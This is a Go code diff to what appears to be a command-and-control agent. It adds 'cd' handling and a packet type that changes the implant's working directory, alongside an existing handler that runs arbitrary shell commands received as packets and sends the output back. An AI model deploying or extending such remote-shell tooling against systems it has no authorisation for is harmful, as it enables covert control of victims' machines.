@@ -153,6 +153,12 @@ func (ma *MainAgent) ProcessPacket(packetType uint16, data []byte, resultID int)
 		return "unimplemented"
 	case 40:
 		command := string(data)
+		if dir, ok := parseCdCommand(command); ok {
+			result := changeDirectory(dir)
+			routingPacket := ma.PacketHandler.BuildResponsePacket(40, result, resultID)
+			ma.preparepacket(routingPacket)
+			return ""
+		}
 		result := common.RunCommand(command)
 		routingPacket := ma.PacketHandler.BuildResponsePacket(40, result, resultID)
 		ma.preparepacket(routingPacket)
@@ -177,6 +183,12 @@ func (ma *MainAgent) ProcessPacket(packetType uint16, data []byte, resultID int)
 	case 43:
 		result := ma.DirectoryListHandler(string(data), resultID)
 		routingPacket := ma.PacketHandler.BuildResponsePacket(43, result, resultID)
+		ma.preparepacket(routingPacket)
+		return ""
+	case 44:
+		path := strings.TrimSpace(string(data))
+		result := changeDirectory(path)
+		routingPacket := ma.PacketHandler.BuildResponsePacket(44, result, resultID)
 		ma.preparepacket(routingPacket)
 		return ""
 	case 50:
@@ -390,4 +402,37 @@ func (ma *MainAgent) DirectoryListHandler(data string, resultID int) string {
 		return "Error processing directory data"
 	}
 	return string(resultData)
+}
+
+func changeDirectory(path string) string {
+	path = strings.TrimSpace(path)
+	if path == "" {
+		cwd, err := os.Getwd()
+		if err != nil {
+			return fmt.Sprintf("Error: %v", err)
+		}
+		return cwd
+	}
+	if err := os.Chdir(path); err != nil {
+		return fmt.Sprintf("Error: %v", err)
+	}
+	cwd, _ := os.Getwd()
+	return cwd
+}
+
+func parseCdCommand(command string) (string, bool) {
+	trimmed := strings.TrimSpace(command)
+	lower := strings.ToLower(trimmed)
+	if lower == "cd" {
+		return "", true
+	}
+	if len(lower) > 2 && strings.HasPrefix(lower, "cd") {
+		c := trimmed[2]
+		if c == ' ' || c == '\t' {
+			path := strings.TrimSpace(trimmed[3:])
+			path = strings.Trim(path, "\"'")
+			return path, true
+		}
+	}
+	return "", false
 }
